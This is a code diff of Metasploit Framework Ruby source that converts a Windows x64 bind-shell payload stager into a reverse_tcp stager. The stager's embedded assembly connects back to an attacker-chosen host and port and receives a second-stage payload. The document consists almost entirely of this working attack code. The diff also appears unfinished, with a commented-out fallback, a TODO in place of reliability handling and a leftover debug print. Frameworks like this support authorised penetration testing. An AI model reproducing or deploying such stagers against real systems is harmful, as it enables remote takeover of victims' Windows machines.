@@ -8,18 +8,21 @@ module Msf
 
 ###
 #
-# Complex bindtcp payload generation for Windows ARCH_X86_64
+# Complex reverse_tcp payload generation for Windows ARCH_X86_64
 #
 ###
 
-module Payload::Windows::BindTcp_x64
+module Payload::Windows::ReverseTcp_x64
 
   include Msf::Payload::Windows
   include Msf::Payload::Windows::BlockApi_x64
   include Msf::Payload::Windows::Exitfunk_x64
 
-  def close_listen_socket
-    datastore['StagerCloseListenSocket'].nil? || datastore['StagerCloseListenSocket'] == true
+  #
+  # Register reverse_tcp specific options
+  #
+  def initialize(*args)
+    super
   end
 
   #
@@ -27,35 +30,37 @@ module Payload::Windows::BindTcp_x64
   #
   def generate
     # Generate the simple version of this stager if we don't have enough space
-    if self.available_space.nil? || required_space > self.available_space
-      return generate_bind_tcp(
-        port:         datastore['LPORT'],
-        close_socket: close_listen_socket
-      )
-    end
+    #if self.available_space.nil? || required_space > self.available_space
+    #  return generate_reverse_tcp(
+    #    port: datastore['LPORT'],
+    #    host: datastore['LHOST'],
+    #    retry_count: datastore['ReverseConnectRetries'],
+    #  )
+    #end
 
     conf = {
-      port:         datastore['LPORT'],
-      exitfunk:     datastore['EXITFUNC'],
-      close_socket: close_listen_socket,
-      reliable:     true
+      host:        datastore['LHOST'],
+      port:        datastore['LPORT'],
+      retry_count: datastore['ReverseConnectRetries'],
+      exitfunk:    datastore['EXITFUNC'],
+      reliable:    true
     }
 
-    generate_bind_tcp(conf)
+    generate_reverse_tcp(conf)
   end
 
   #
   # Generate and compile the stager
   #
-  def generate_bind_tcp(opts={})
+  def generate_reverse_tcp(opts={})
     combined_asm = %Q^
       cld                    ; Clear the direction flag.
-      and rsp, 0xFFFFFFFFFFFFFFF0 ; Ensure RSP is 16 byte aligned
+      and rsp, 0xFFFFFFFFFFFFFFF0 ; Ensure RSP is 16 byte aligned 
       call start             ; Call start, this pushes the address of 'api_call' onto the stack.
       #{asm_block_api}
       start:
-        pop rbp              ; pop off the address of 'api_call' for calling later.
-      #{asm_bind_tcp(opts)}
+        pop rbp
+      #{asm_reverse_tcp(opts)}
     ^
     Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
   end
@@ -70,15 +75,8 @@ module Payload::Windows::BindTcp_x64
     # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
     space += 31
 
-    # EXITFUNK unset will still call ExitProces, which adds 7 bytes (accounted for above)
-
-    # Reliability checks add 4 bytes for the first check, 5 per recv check (2)
-    #space += 14
-
-    # if the payload doesn't need the listen socket closed then we save space. This is
-    # the case for meterpreter payloads, as metsrv now closes the listen socket once it
-    # kicks off (needed for more reliable shells).
-    space -= 11 unless close_listen_socket
+    # Reliability adds 10 bytes for recv error checks
+    space += 10
 
     # The final estimated size
     space
@@ -91,23 +89,27 @@ module Payload::Windows::BindTcp_x64
   # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
   # @option opts [Bool] :reliable Whether or not to enable error handling code
   #
-  def asm_bind_tcp(opts={})
-    reliable     = opts[:reliable]
-    close_socket = opts[:close_socket]
-    encoded_port = "0x%.16x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
+  def asm_reverse_tcp(opts={})
+
+    #retry_count  = [opts[:retry_count].to_i, 1].max
+    # TODO: reliable     = opts[:reliable]
+    encoded_port = [opts[:port].to_i,2].pack("vn").unpack("N").first
+    encoded_host = Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
+    encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
+    STDERR.puts("#{encoded_host_port}\n")
 
     asm = %Q^
-      bind_tcp:
+      reverse_tcp:
         ; setup the structures we need on the stack...
         mov r14, 'ws2_32'
         push r14               ; Push the bytes 'ws2_32',0,0 onto the stack.
         mov r14, rsp           ; save pointer to the "ws2_32" string for LoadLibraryA call.
-        sub rsp, 408+8         ; alloc sizeof( struct WSAData ) bytes for the WSAData
+        sub rsp, #{408+8}      ; alloc sizeof( struct WSAData ) bytes for the WSAData
                                ; structure (+8 for alignment)
         mov r13, rsp           ; save pointer to the WSAData structure for WSAStartup call.
-        mov r12, #{encoded_port}        
-        push r12               ; bind to 0.0.0.0 family AF_INET and port 4444
-        mov r12, rsp           ; save pointer to sockaddr_in struct for bind call
+        mov r12, #{encoded_host_port}
+        push r12               ; host, family AF_INET and port
+        mov r12, rsp           ; save pointer to sockaddr struct for connect call
         ; perform the call to LoadLibraryA...
         mov rcx, r14           ; set the param for the library to load
         mov r10d, 0x0726774C   ; hash( "kernel32.dll", "LoadLibraryA" )
@@ -130,44 +132,15 @@ module Payload::Windows::BindTcp_x64
         mov r10d, 0xE0DF0FEA   ; hash( "ws2_32.dll", "WSASocketA" )
         call rbp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
         mov rdi, rax           ; save the socket for later
-        ; perform the call to bind...
-        push 16                ; 
-        pop r8                 ; length of the sockaddr_in struct (we only set the
-                               ; first 8 bytes as the last 8 are unused)
-        mov rdx, r12           ; set the pointer to sockaddr_in struct
-        mov rcx, rdi           ; socket
-        mov r10d, 0x6737DBC2   ; hash( "ws2_32.dll", "bind" )
-        call rbp               ; bind( s, &sockaddr_in, 16 );
-        ; perform the call to listen...
-        xor rdx, rdx           ; backlog
-        mov rcx, rdi           ; socket
-        mov r10d, 0xFF38E9B7   ; hash( "ws2_32.dll", "listen" )
-        call rbp               ; listen( s, 0 );
-        ; perform the call to accept...
-        xor r8, r8             ; we set length for the sockaddr struct to zero
-        xor rdx, rdx           ; we dont set the optional sockaddr param
-        mov rcx, rdi           ; listening socket
-        mov r10d, 0xE13BEC74   ; hash( "ws2_32.dll", "accept" )
-        call rbp               ; accept( s, 0, 0 );
-      ^
-
-    if close_socket
-      asm << %Q^
-        ; perform the call to closesocket...
-        mov rcx, rdi           ; the listening socket to close
-        mov rdi, rax           ; swap the new connected socket over the listening socket
-        mov r10d, 0x614D6E75   ; hash( "ws2_32.dll", "closesocket" )
-        call rbp               ; closesocket( s );
-      ^
-    else
-      asm << %Q^
-        mov rdi, rax           ; swap the new connected socket over the listening socket
-      ^
-    end
-
-    asm << %Q^
+        ; perform the call to connect...
+        push 16                ; length of the sockaddr struct
+        pop r8                 ; pop off the third param
+        mov rdx, r12           ; set second param to pointer to sockaddr struct
+        mov rcx, rdi           ; the socket
+        mov r10d, 0x6174A599   ; hash( "ws2_32.dll", "connect" )
+        call rbp               ; connect( s, &sockaddr, 16 );
         ; restore RSP so we dont have any alignment issues with the next block...
-        add rsp, #{408+8+8*4+32*7} ; cleanup the stack allocations
+        add rsp, #{408+8+8*4+32*4} ; cleanup the stack allocations
 
       recv:
         ; Receive the size of the incoming second stage...
